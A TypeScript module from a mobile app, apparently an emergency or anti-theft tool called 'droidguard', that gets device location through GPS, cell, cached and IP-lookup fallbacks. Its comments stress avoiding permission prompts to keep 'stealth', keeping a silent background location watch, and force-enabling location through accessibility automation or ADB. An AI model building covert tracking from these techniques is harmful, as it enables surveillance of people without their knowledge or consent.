import { Geolocation } from '@capacitor/geolocation';
import { AsyncStorage } from './storage';
import { fetchNativeHardwareLocation, forceEnableLocation } from './nativeEmergencySms';

export interface LocationResult {
  latitude: number;
  longitude: number;
  accuracy: number;
  mapsUrl: string;
  timestamp: string;
  source: 'gps_satellite' | 'cached_gps' | 'network_cell' | 'ip_geolocation' | 'unavailable';
}

const STORAGE_LAST_LOCATION = '@droidguard_last_gps_location';
let latestCachedLocation: LocationResult | null = null;
let backgroundWatchId: string | null = null;

export async function initializeBackgroundGPS(): Promise<boolean> {
  try {
    const raw = await AsyncStorage.getItem(STORAGE_LAST_LOCATION);
    if (raw) {
      latestCachedLocation = JSON.parse(raw);
    }
  } catch {
    // ignore
  }

  try {
    const perm = await Geolocation.checkPermissions();
    if (perm.location !== 'granted') {
      // We rely EXCLUSIVELY on the unified startup permission prompt (requestStartupSecurityPermissions).
      // If it wasn't granted there, do NOT prompt here, as it breaks stealth.
      return false;
    }

    startSilentBackgroundWatch();
    return true;
  } catch (e) {
    console.warn('[Location] Geolocation init error:', e);
    return false;
  }
}

export async function promptActivateHardwareGPS(): Promise<{ success: boolean; message: string; loc?: LocationResult }> {
  try {
    const perm = await Geolocation.requestPermissions();
    if (perm.location !== 'granted') {
      return { success: false, message: 'تم رفض إذن الموقع الجغرافي. يرجى تفعيله من الإعدادات.' };
    }
    
    const pos = await Geolocation.getCurrentPosition({ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
    
    const lat = parseFloat(pos.coords.latitude.toFixed(6));
    const lng = parseFloat(pos.coords.longitude.toFixed(6));
    const accuracy = Math.round(pos.coords.accuracy);
    const res: LocationResult = {
      latitude: lat,
      longitude: lng,
      accuracy,
      mapsUrl: `https://maps.google.com/?q=${lat},${lng}`,
      timestamp: new Date().toLocaleTimeString(),
      source: 'gps_satellite',
    };
    
    latestCachedLocation = res;
    await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
    startSilentBackgroundWatch();
    
    return {
      success: true,
      message: `تم تفعيل الـ GPS بنجاح! الإحداثيات الحالية: ${lat}, ${lng} (دقة ${accuracy}م)`,
      loc: res,
    };
  } catch (err: any) {
    return { success: false, message: 'تعذر تشغيل الـ GPS: ' + err.message };
  }
}

async function startSilentBackgroundWatch() {
  if (backgroundWatchId !== null) return;

  try {
    backgroundWatchId = await Geolocation.watchPosition(
      { enableHighAccuracy: true, maximumAge: 10000, timeout: 15000 },
      async (pos, err) => {
        if (err || !pos) return;

        const lat = parseFloat(pos.coords.latitude.toFixed(6));
        const lng = parseFloat(pos.coords.longitude.toFixed(6));
        const accuracy = Math.round(pos.coords.accuracy);
        
        const res: LocationResult = {
          latitude: lat,
          longitude: lng,
          accuracy,
          mapsUrl: `https://maps.google.com/?q=${lat},${lng}`,
          timestamp: new Date().toLocaleTimeString(),
          source: 'gps_satellite',
        };
        
        latestCachedLocation = res;
        await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
      }
    );
  } catch (e) {
    console.warn('[Location] Failed to start watchPosition:', e);
  }
}

export async function fetchDeviceLocation(): Promise<LocationResult> {
  const timestamp = new Date().toLocaleTimeString();
  
  // Try to force enable hardware location first (via Accessibility automated switch / ADB)
  try {
    const forceRes = await forceEnableLocation();
    if (forceRes && !forceRes.alreadyEnabled) {
      // If location was just activated, give hardware GPS provider 1.2s to start broadcasting fixes
      await new Promise((r) => setTimeout(r, 1200));
    }
  } catch (e) {
    console.warn('[Location] forceEnableLocation error:', e);
  }

  let baseline = latestCachedLocation;
  if (!baseline) {
    try {
      const stored = await AsyncStorage.getItem(STORAGE_LAST_LOCATION);
      if (stored) {
        baseline = JSON.parse(stored);
      }
    } catch {
      // ignore
    }
  }

  // Tier 1: Try Native Android Hardware Location (GPS + Cell Network Provider + Passive Provider)
  try {
    const nativeLoc = await fetchNativeHardwareLocation();
    if (nativeLoc && nativeLoc.success && nativeLoc.latitude !== 0 && nativeLoc.longitude !== 0) {
      const res: LocationResult = {
        latitude: nativeLoc.latitude,
        longitude: nativeLoc.longitude,
        accuracy: nativeLoc.accuracy,
        mapsUrl: nativeLoc.mapsUrl,
        timestamp,
        source: nativeLoc.source === 'hardware_live' ? 'gps_satellite' : 'cached_gps',
      };
      latestCachedLocation = res;
      try {
        await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
      } catch {}
      return res;
    }
  } catch (err) {
    console.warn('[Location] Native hardware location fetch failed:', err);
  }

  // Tier 2: Capacitor Geolocation with High Accuracy (Satellite)
  try {
    const perm = await Geolocation.checkPermissions();
    if (perm.location === 'granted' || perm.coarseLocation === 'granted') {
      try {
        const pos = await Geolocation.getCurrentPosition({ enableHighAccuracy: true, maximumAge: 30000, timeout: 6000 });
        const lat = parseFloat(pos.coords.latitude.toFixed(6));
        const lng = parseFloat(pos.coords.longitude.toFixed(6));
        const accuracy = Math.round(pos.coords.accuracy);
        
        const res: LocationResult = {
          latitude: lat,
          longitude: lng,
          accuracy,
          mapsUrl: `https://maps.google.com/?q=${lat},${lng}`,
          timestamp,
          source: 'gps_satellite',
        };
        
        latestCachedLocation = res;
        try {
          await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
        } catch {}
        return res;
      } catch (highAccErr) {
        console.warn('[Location] High accuracy fetch timed out, falling back to low accuracy (Cell/WiFi):', highAccErr);
      }

      // Tier 3: Capacitor Geolocation with Low Accuracy (Cellular Towers / Wi-Fi) - Fast indoor response!
      try {
        const posLow = await Geolocation.getCurrentPosition({ enableHighAccuracy: false, maximumAge: 120000, timeout: 4000 });
        const lat = parseFloat(posLow.coords.latitude.toFixed(6));
        const lng = parseFloat(posLow.coords.longitude.toFixed(6));
        const accuracy = Math.round(posLow.coords.accuracy);

        const res: LocationResult = {
          latitude: lat,
          longitude: lng,
          accuracy,
          mapsUrl: `https://maps.google.com/?q=${lat},${lng}`,
          timestamp,
          source: 'network_cell',
        };

        latestCachedLocation = res;
        try {
          await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
        } catch {}
        return res;
      } catch (lowAccErr) {
        console.warn('[Location] Low accuracy fetch also failed:', lowAccErr);
      }
    }
  } catch (err) {
    console.warn('[Location] Geolocation permission or call error:', err);
  }

  // Tier 4: Use previously stored/cached GPS fix
  if (baseline && baseline.latitude !== 0 && baseline.longitude !== 0) {
    return { ...baseline, timestamp, source: 'cached_gps' };
  }

  // Tier 5: IP-based Geolocation fallback (works if internet/cellular data is connected)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3500);
    const ipRes = await fetch('https://ipwho.is/', { signal: controller.signal });
    clearTimeout(timeoutId);
    if (ipRes.ok) {
      const data = await ipRes.json();
      if (data && data.success && typeof data.latitude === 'number' && typeof data.longitude === 'number') {
        const lat = parseFloat(data.latitude.toFixed(6));
        const lng = parseFloat(data.longitude.toFixed(6));
        const res: LocationResult = {
          latitude: lat,
          longitude: lng,
          accuracy: 1000,
          mapsUrl: `https://maps.google.com/?q=${lat},${lng}`,
          timestamp,
          source: 'ip_geolocation',
        };
        latestCachedLocation = res;
        try {
          await AsyncStorage.setItem(STORAGE_LAST_LOCATION, JSON.stringify(res));
        } catch {}
        return res;
      }
    }
  } catch (ipErr) {
    console.warn('[Location] IP geolocation fallback error:', ipErr);
  }

  // Tier 6: Last resort if completely disabled without signal
  return {
    latitude: 0,
    longitude: 0,
    accuracy: 0,
    mapsUrl: 'https://maps.google.com/ (يرجى تفعيل خدمة GPS في الهاتف)',
    timestamp,
    source: 'unavailable',
  };
}
